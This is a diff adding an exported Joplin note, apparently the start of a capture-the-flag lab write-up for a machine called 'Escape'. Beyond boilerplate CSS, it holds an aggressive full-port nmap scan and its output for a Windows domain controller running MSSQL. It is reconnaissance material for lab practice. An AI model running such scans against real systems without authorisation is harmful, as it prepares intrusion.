@@ -1,0 +1,1692 @@
+
+				
+				<html>
+					<head>
+						<meta charset="UTF-8"/>
+						<meta name="viewport" content="width=device-width, initial-scale=1"/>
+						<style>pre code.hljs {
+  display: block;
+  overflow-x: auto;
+  padding: 1em;
+}
+
+code.hljs {
+  padding: 3px 5px;
+}
+
+/*
+
+Atom One Light by Daniel Gamage
+Original One Light Syntax theme from https://github.com/atom/one-light-syntax
+
+base:    #fafafa
+mono-1:  #383a42
+mono-2:  #686b77
+mono-3:  #a0a1a7
+hue-1:   #0184bb
+hue-2:   #4078f2
+hue-3:   #a626a4
+hue-4:   #50a14f
+hue-5:   #e45649
+hue-5-2: #c91243
+hue-6:   #986801
+hue-6-2: #c18401
+
+*/
+
+.hljs {
+  color: #383a42;
+  background: #fafafa;
+}
+
+.hljs-comment,
+.hljs-quote {
+  color: #a0a1a7;
+  font-style: italic;
+}
+
+.hljs-doctag,
+.hljs-keyword,
+.hljs-formula {
+  color: #a626a4;
+}
+
+.hljs-section,
+.hljs-name,
+.hljs-selector-tag,
+.hljs-deletion,
+.hljs-subst {
+  color: #e45649;
+}
+
+.hljs-literal {
+  color: #0184bb;
+}
+
+.hljs-string,
+.hljs-regexp,
+.hljs-addition,
+.hljs-attribute,
+.hljs-meta .hljs-string {
+  color: #50a14f;
+}
+
+.hljs-attr,
+.hljs-variable,
+.hljs-template-variable,
+.hljs-type,
+.hljs-selector-class,
+.hljs-selector-attr,
+.hljs-selector-pseudo,
+.hljs-number {
+  color: #986801;
+}
+
+.hljs-symbol,
+.hljs-bullet,
+.hljs-link,
+.hljs-meta,
+.hljs-selector-id,
+.hljs-title {
+  color: #4078f2;
+}
+
+.hljs-built_in,
+.hljs-title.class_,
+.hljs-class .hljs-title {
+  color: #c18401;
+}
+
+.hljs-emphasis {
+  font-style: italic;
+}
+
+.hljs-strong {
+  font-weight: bold;
+}
+
+.hljs-link {
+  text-decoration: underline;
+}</style>
+						<title>Escape</title>
+					</head>
+					<body>
+						<div class="exported-note"><div class="exported-note-title">Escape</div>
+
+<style>
+		/* https://necolas.github.io/normalize.css/ */
+		html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}
+		article,aside,footer,header,nav,section{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}
+		pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}
+		b,strong{font-weight:bolder}small{font-size:80%}img{border-style:none}
+
+		body {
+			font-size: 15px;
+			color: #32373F;
+			word-wrap: break-word;
+			line-height: 1.6em;
+			background-color: #ffffff;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+			padding-bottom: 0px;
+			padding-top: 0px;
+		}
+		kbd {
+			border: 1px solid rgb(220, 220, 220);
+			box-shadow: inset 0 -1px 0 rgb(220, 220, 220);
+			padding: 2px 4px;
+			border-radius: 3px;
+			background-color: rgb(243, 243, 243);
+		}
+
+		:root {
+			--scrollbar-size: 7px;
+		}
+
+		::-webkit-scrollbar {
+			width: var(--scrollbar-size);
+			height: var(--scrollbar-size);
+		}
+		::-webkit-scrollbar-thumb {
+			border-radius: calc(var(--scrollbar-size) / 2);
+		}
+		::-webkit-scrollbar-corner {
+			background: none;
+		}
+		::-webkit-scrollbar-track {
+			border: none;
+		}
+		::-webkit-scrollbar-thumb {
+			background: rgba(50, 55, 63, 0.54); 
+		}
+		::-webkit-scrollbar-track:hover {
+			background: rgba(0, 0, 0, 0.1); 
+		}
+		::-webkit-scrollbar-thumb:hover {
+			background: rgba(50, 55, 63, 0.63); 
+		}
+
+		
+
+		/* Remove top padding and margin from first child so that top of rendered text is aligned to top of text editor text */
+
+		#rendered-md > h1:first-child,
+		#rendered-md > h2:first-child,
+		#rendered-md > h3:first-child,
+		#rendered-md > h4:first-child,
+		#rendered-md > ul:first-child,
+		#rendered-md > ol:first-child,
+		#rendered-md > table:first-child,
+		#rendered-md > blockquote:first-child,
+		#rendered-md > img:first-child,
+		#rendered-md > p:first-child {
+			margin-top: 0;
+			padding-top: 0;
+		}
+		
+		p, h1, h2, h3, h4, h5, h6, ul, table {
+			margin-top: .6em;
+			margin-bottom: 1.35em;
+
+			/*
+				Adds support for RTL text in the note body. It automatically detects the direction using the content.
+				Issue: https://github.com/laurent22/joplin/issues/3991
+			*/
+			unicode-bidi: plaintext;
+		}
+
+		h1, h2, h3, h4, h5, h6, ul, table {
+			margin-bottom: 0.65em;
+		}
+
+		h1, h2, h3, h4, h5, h6 {
+			line-height: 1.5em;
+		}
+		h1 {
+			font-size: 1.5em;
+			font-weight: bold;
+			border-bottom: 1px solid #dddddd;
+			padding-bottom: .3em;
+		}
+		h2 {
+			font-size: 1.3em;
+			font-weight: bold;
+			padding-bottom: .1em; */
+		}
+		h3 {
+			font-size: 1.1em;
+			font-weight: bold;
+		}
+		h4, h5, h6 {
+			font-size: 1em;
+			font-weight: bold;
+		}
+
+		.exported-note-title {
+			font-size: 2em;
+			font-weight: bold;
+			margin-bottom: 0.8em;
+			line-height: 1.5em;
+			padding-bottom: .35em;
+			border-bottom: 1px solid #dddddd;
+		}
+
+		a {
+			color: #155BDA;
+		}
+		ul, ol {
+			padding-left: 0;
+			margin-left: 1.7em;
+		}
+		li {
+			margin-bottom: .4em;
+		}
+		li p {
+			margin-top: 0.2em;
+			margin-bottom: 0;
+		}
+
+		dt {
+			font-weight: bold;
+			margin-bottom: 0.25em;
+		}
+
+		dd {
+			margin-inline-start: 2.5em;
+			margin-bottom: 0.5em;
+		}
+
+		.resource-icon {
+			display: inline-block;
+			position: relative;
+			top: 0.3em;
+			text-decoration: none;
+			width: 1.2em;
+			height: 1.4em;
+			margin-right: 0.4em;
+			background-color:  #155BDA;
+		}
+    /* These icons are obtained from the wonderful ForkAwesome project by copying the src svgs 
+     * into the css classes below.
+     * svgs are obtained from https://github.com/ForkAwesome/Fork-Awesome/tree/master/src/icons/svg
+     * instead of the svg width, height property you must use a viewbox here, 0 0 1536 1792 is typically the actual size of the icon
+     * each line begins with the pre-amble -webkit-mask: url("data:image/svg+xml;utf8,
+     * and of course finishes with ");
+     * to prevent artifacts it is also necessary to include -webkit-mask-repeat: no-repeat;
+     * on the following line
+     * */
+		.fa-joplin {
+			/* Awesome Font file */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M373.834 128C168.227 128 0 296.223 0 501.834v788.336C0 1495.778 168.227 1664 373.834 1664h788.336c205.608 0 373.83-168.222 373.83-373.83V501.834C1536 296.224 1367.778 128 1162.17 128zm397.222 205.431h417.424a7.132 7.132 0 0 1 7.132 7.133v132.552c0 4.461-3.619 8.073-8.077 8.073h-57.23c-24.168 0-43.768 19.338-44.284 43.374v2.377h-.017v136.191h-.053l-.466 509.375c-5.02 77.667-39.222 149.056-96.324 201.046-60.28 54.834-141.948 85.017-229.962 85.017-12.45 0-25.208-.61-37.907-1.785-92.157-8.682-181.494-48.601-251.662-112.438-71.99-65.517-117.147-150.03-127.164-238-11.226-98.763 23.42-192.783 95.045-257.937 81.99-74.637 198.185-101.768 316.613-75.704 5.574 1.227 9.55 6.282 9.55 11.997v199.52c-.199 2.625-1.481 6.599-8.183 2.896-.663-.365-1.194-.511-1.653-.531-21.987-10.587-45.159-17.57-68.559-19.916-.38-.04-.757-.124-1.138-.163-.537-.048-1.034-.033-1.556-.075-4.13-.354-8.183-.517-12.203-.58-.87-.011-1.771-.127-2.641-.127-.486 0-.951.05-1.437.057-1.464.011-2.886.115-4.33.163-2.76.102-5.497.211-8.182.448-.273.024-.547.07-.835.097-25.509 2.4-47.864 11.104-65.012 25.47-.954.802-1.974 1.53-2.9 2.36a1.34 1.34 0 0 1-.168.146c-23.96 21.8-34.881 53.872-30.726 90.316 4.62 40.737 26.94 81.156 62.841 113.823 35.908 32.67 80.335 52.977 125.113 57.186 35.118 3.36 66.547-3.919 89.899-20.461a97.255 97.255 0 0 0 9.365-7.501c2.925-2.661 5.569-5.5 8.086-8.416.3-.348.672-.673.975-1.024 8.253-9.864 14.222-21.067 17.996-33.148.639-2.034 1.051-4.148 1.564-6.227.381-1.563.81-3.106 1.112-4.693.555-2.784.923-5.632 1.253-8.49.086-.709.183-1.414.237-2.128.492-4.893.693-9.858.55-14.91h.013V521.623c-2.01-22.626-20.78-40.434-43.928-40.434h-57.23a8.071 8.071 0 0 1-8.077-8.073V340.564a7.132 7.132 0 0 1 7.136-7.133z'/></svg>");
+		}
+		.fa-file-image {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-128-448v320H256v-192l192-192 128 128 384-384zm-832-192c-106 0-192-86-192-192s86-192 192-192 192 86 192 192-86 192-192 192z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-pdf {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-514-593c25 20 53 38 84 56 42-5 81-7 117-7 67 0 152 8 177 49 7 10 13 28 2 52-1 1-2 3-3 4v1c-3 18-18 38-71 38-64 0-161-29-245-73-139 15-285 46-392 83-103 176-182 262-242 262-10 0-19-2-28-7l-24-12c-3-1-4-3-6-5-5-5-9-16-6-36 10-46 64-123 188-188 8-5 18-2 23 6 1 1 2 3 2 4 31-51 67-116 107-197 45-90 80-178 104-262-32-109-42-221-24-287 7-25 22-40 42-40h22c15 0 27 5 35 15 12 14 15 36 9 68-1 3-2 6-4 8 1 3 1 5 1 8v30c-1 63-2 123-14 192 35 105 87 190 146 238zm-576 411c30-14 73-57 137-158-75 58-122 124-137 158zm398-920c-10 28-10 76-2 132 3-16 5-31 7-44 2-17 5-31 7-43 1-3 2-5 4-8-1-1-1-3-2-5-1-18-7-29-13-36 0 2-1 3-1 4zm-124 661c88-35 186-63 284-81-10-8-20-15-29-23-49-43-93-103-127-176-19 61-47 126-83 197-15 28-30 56-45 83zm646-16c-5-5-31-24-140-24 49 18 94 28 124 28 9 0 14 0 18-1 0-1-1-2-2-3z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-word {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM233 768v107h70l164 661h159l128-485c5-15 8-30 10-46 1-8 2-16 2-24h4l3 24c3 14 4 30 9 46l128 485h159l164-661h70V768h-300v107h90l-99 438c-4 16-6 33-7 46l-2 21h-4c0-6-2-14-3-21-3-13-5-30-9-46L825 768H711l-144 545c-4 16-5 33-8 46l-4 21h-4l-2-21c-1-13-3-30-7-46l-99-438h90V768H233z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-powerpoint {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-992-234v106h327v-106h-93v-167h137c43 0 82-2 118-15 90-31 146-124 146-233s-54-193-137-228c-38-15-84-19-130-19H416v107h92v555h-92zm353-280H650V882h120c35 0 62 6 83 18 36 21 56 62 56 115 0 56-20 99-62 120-21 10-47 15-78 15z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-excel {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-979-234v106h281v-106h-75l103-161c12-19 18-34 21-34h2c1 4 3 7 5 10 4 8 10 14 17 24l107 161h-76v106h291v-106h-68l-192-273 195-282h67V768H828v107h74l-103 159c-12 19-21 34-21 33h-2c-1-4-3-7-5-10-4-7-9-14-17-23L648 875h76V768H434v107h68l189 272-194 283h-68z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-audio {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM620 850c12 5 20 17 20 30v544c0 13-8 25-20 30-4 1-8 2-12 2-8 0-16-3-23-9l-166-167H288c-18 0-32-14-32-32v-192c0-18 14-32 32-32h131l166-167c10-9 23-12 35-7zm417 689c19 0 37-8 50-24 83-102 129-231 129-363s-46-261-129-363c-22-28-63-32-90-10-28 23-32 63-9 91 65 80 100 178 100 282s-35 202-100 282c-23 28-19 68 9 90 12 10 26 15 40 15zm-211-148c17 0 34-7 47-20 56-60 87-137 87-219s-31-159-87-219c-24-26-65-27-91-3-25 24-27 65-2 91 33 36 52 82 52 131s-19 95-52 131c-25 26-23 67 2 91 13 11 29 17 44 17z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-video {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM768 768c70 0 128 58 128 128v384c0 70-58 128-128 128H384c-70 0-128-58-128-128V896c0-70 58-128 128-128h384zm492 2c12 5 20 17 20 30v576c0 13-8 25-20 30-4 1-8 2-12 2-8 0-17-3-23-9l-265-266v-90l265-266c6-6 15-9 23-9 4 0 8 1 12 2z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-archive {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M640 384V256H512v128h128zm128 128V384H640v128h128zM640 640V512H512v128h128zm128 128V640H640v128h128zm700-388c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H768v128H640V128H128v1536h1280zM781 943c85 287 107 349 107 349 5 17 8 34 8 52 0 111-108 192-256 192s-256-81-256-192c0-18 3-35 8-52 0 0 21-62 120-396V768h128v128h79c29 0 54 19 62 47zm-141 465c71 0 128-29 128-64s-57-64-128-64-128 29-128 64 57 64 128 64z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-code {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM480 768c11-14 31-17 45-6l51 38c14 11 17 31 6 45l-182 243 182 243c11 14 8 34-6 45l-51 38c-14 11-34 8-45-6l-226-301c-8-11-8-27 0-38zm802 301c8 11 8 27 0 38l-226 301c-11 14-31 17-45 6l-51-38c-14-11-17-31-6-45l182-243-182-243c-11-14-8-34 6-45l51-38c14-11 34-8 45 6zm-620 461c-18-3-29-20-26-37l138-831c3-18 20-29 37-26l63 10c18 3 29 20 26 37l-138 831c-3 18-20 29-37 26z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-alt, .fa-file-csv {
+      /* fork-awesome doesn't have csv so we use the text icon */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM384 800c0-18 14-32 32-32h704c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64zm736 224c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704zm0 256c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		blockquote {
+			border-left: 4px solid rgb(220, 220, 220);
+			padding-left: 1.2em;
+			margin-left: 0;
+			opacity: 0.7;
+		}
+
+		.jop-tinymce table,
+		table {
+			text-align: left;
+			border-collapse: collapse;
+			border: 1px solid rgb(220, 220, 220);
+			background-color: #ffffff;
+		}
+
+		.jop-tinymce table td, .jop-tinymce table th,
+		table td, th {
+			text-align: left;
+			padding: .5em 1em .5em 1em;
+			font-size: 15;
+			color: #32373F;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+		}
+
+		.jop-tinymce table td,
+		table td {
+			border: 1px solid rgb(220, 220, 220);
+		}
+
+		.jop-tinymce table th,
+		table th {
+			border: 1px solid rgb(220, 220, 220);
+			border-bottom: 2px solid rgb(220, 220, 220);
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:nth-child(even),
+		table:has(thead) tr:nth-child(even) {
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:hover,
+		table tr:hover {
+			background-color: #e5e5e5;
+		}
+
+		hr {
+			border: none;
+			border-bottom: 2px solid #dddddd;
+		}
+		img {
+			max-width: 100%;
+			height: auto;
+		}
+		
+		.inline-code,
+		.mce-content-body code {
+			border: 1px solid rgb(220, 220, 220);
+			background-color: rgb(243, 243, 243);
+			padding-right: .2em;
+			padding-left: .2em;
+			border-radius: .25em;
+			color: rgb(0,0,0);
+			font-size: .9em;
+		}
+
+		.highlighted-keyword {
+			background-color: #F3B717;
+			color: black;
+		}
+
+		
+	.not-loaded-resource img {
+		width: 1.15em;
+		height: 1.15em;
+		background: white;
+		padding: 2px !important;
+		border-radius: 2px;
+		box-shadow: 0 1px 3px #000000aa;
+	}
+
+	a.not-loaded-resource img {
+		margin-right: .2em;
+	}
+
+	a.not-loaded-resource {
+		display: flex;
+		flex-direction: row;
+		align-items: center;
+	}
+
+
+		.md-checkbox input[type=checkbox]:checked {
+			opacity: 0.7;
+		}
+
+		.jop-tinymce ul.joplin-checklist .checked,
+		.md-checkbox .checkbox-label-checked {
+			opacity: 0.5;
+		}
+
+		.exported-note {
+			padding: 1em;
+		}
+
+		.joplin-editable .joplin-source {
+			display: none;
+		}
+
+		mark {
+			background: #F7D26E;
+			color: black;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		.mce-content-body {
+			/* Note: we give a bit more padding at the bottom, to allow scrolling past the end of the document */
+			padding: 5px 10px 10em 0;
+		}
+
+		/*
+		.mce-content-body code {
+			background-color: transparent;
+		}
+		*/
+
+		.mce-content-body [data-mce-selected=inline-boundary] {
+			background-color: transparent;
+		}
+
+		.mce-content-body .joplin-editable {
+			cursor: pointer !important;
+		}
+
+		.mce-content-body.mce-content-readonly {
+			opacity: 0.5;
+		}
+
+		/* We need that to make sure click events have the A has a target */
+		.katex a span {
+			pointer-events: none;
+		}
+
+		.media-player {
+			width: 100%;
+			margin-top: 10px;
+		}
+
+		.media-player.media-pdf {
+			min-height: 35rem;
+			width: 100%;
+			max-width: 1000px;
+			margin: 0;
+			border: 0;
+			display: block;
+		}
+
+		/* Clear the CODE style if the element is within a joplin-editable block */
+		.mce-content-body .joplin-editable code {
+			border: none;
+			background: none;
+			padding: 0;
+			color: inherit;
+			font-size: inherit;
+		}
+
+		/* To make code blocks horizontally scrollable */
+		/* https://github.com/laurent22/joplin/issues/5740 */
+		pre.hljs {
+			overflow-x: auto;
+		}
+
+		.joplin-table-wrapper{
+			overflow-x: auto;
+			overflow-y: hidden;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		@media print {
+			body {
+				height: auto !important;
+			}
+
+			pre {
+				white-space: pre-wrap;
+			}
+
+			.code, .inline-code {
+				border: 1px solid #CBCBCB;
+			}
+
+			#joplin-container-content {
+				/* The height of the content is set dynamically by JavaScript (in updateBodyHeight) to go
+				   around various issues related to scrolling. However when printing we don't want this
+				   fixed size as that would crop the content. So we set it to auto here. "important" is
+				   needed to override the style set by JavaScript at the element-level. */
+				height: auto !important;
+			}
+		}
+	
+
+				/*
+					FOR THE MARKDOWN EDITOR
+				*/
+
+				/* Remove the indentation from the checkboxes at the root of the document
+				   (otherwise they are too far right), but keep it for their children to allow
+				   nested lists. Make sure this value matches the UL margin. */
+
+				li.md-checkbox {
+					list-style-type: none;
+				}
+
+				li.md-checkbox input[type=checkbox] {
+					margin-left: -1.71em;
+					margin-right: 0.7em;
+					position: relative;
+					top: 1px;
+				}
+				
+				ul.joplin-checklist {
+					list-style:none;
+				}
+
+				/*
+					FOR THE RICH TEXT EDITOR
+				*/
+
+				ul.joplin-checklist li::before {
+					content:"\f14a";
+					font-family:"Font Awesome 5 Free";
+					background-size: 16px 16px;
+					pointer-events: all;
+					cursor: pointer;
+					width: 1em;
+					height: 1em;
+					margin-left: -1.3em;
+					position: absolute;
+					color: #32373F;
+				}
+
+				.joplin-checklist li:not(.checked)::before {
+					content:"\f0c8";
+				}
+
+				.abc-notation-block svg {
+					background-color: white;
+				}
+			
+.mermaid { width: 640px; }
+pre.mermaid[data-processed=true] { white-space: unset; }
+.mermaid-export-graph {
+					opacity: 0;
+					height: 0;
+					z-index: 1;
+					position: relative;
+				} 
+				.joplin-editable:hover .mermaid-export-graph,
+				.joplin-editable .mermaid-export-graph:has(:focus-visible) {
+					opacity: 1;
+				}
+				.mermaid-export-graph > button:hover {
+					background-color: #CBDAF1 !important;
+				}</style><div id="rendered-md"><h2 id="escape">Escape</h2>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ sudo nmap -sS -sV -A 10.129.228.253 -p- -Pn
+[sudo] password for kali: 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-01 19:05 -0500
+Nmap scan report for 10.129.228.253
+Host is up (0.012s latency).
+Not shown: 65516 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-02 08:08:34Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+|_ssl-date: 2026-02-02T08:10:10+00:00; +8h00m00s from scanner time.
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+|_ssl-date: 2026-02-02T08:10:11+00:00; +8h00m00s from scanner time.
+1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info: 
+|   10.129.228.253:1433: 
+|     Target_Name: sequel
+|     NetBIOS_Domain_Name: sequel
+|     NetBIOS_Computer_Name: DC
+|     DNS_Domain_Name: sequel.htb
+|     DNS_Computer_Name: dc.sequel.htb
+|     DNS_Tree_Name: sequel.htb
+|_    Product_Version: 10.0.17763
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2026-02-02T08:04:06
+|_Not valid after:  2056-02-02T08:04:06
+| ms-sql-info: 
+|   10.129.228.253:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+|_ssl-date: 2026-02-02T08:10:10+00:00; +8h00m00s from scanner time.
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+|_ssl-date: 2026-02-02T08:10:10+00:00; +8h00m00s from scanner time.
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-02-02T08:10:11+00:00; +8h00m00s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49690/tcp open  msrpc         Microsoft Windows RPC
+49711/tcp open  msrpc         Microsoft Windows RPC
+49721/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-02-02T08:09:34
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
+
+TRACEROUTE (using port 445/tcp)
+HOP RTT      ADDRESS
+1   13.11 ms 10.10.14.1
+2   13.31 ms 10.129.228.253
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 299.03 seconds</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Escape]
+&boxur;&boxh;$ sudo nmap -sS -sV -A 10.129.228.253 -p- -Pn
+[sudo] password for kali: 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-01 19:05 -0500
+Nmap scan report for 10.129.228.253
+Host is up (0.012s latency).
+Not shown: 65516 filtered tcp ports (no-response)
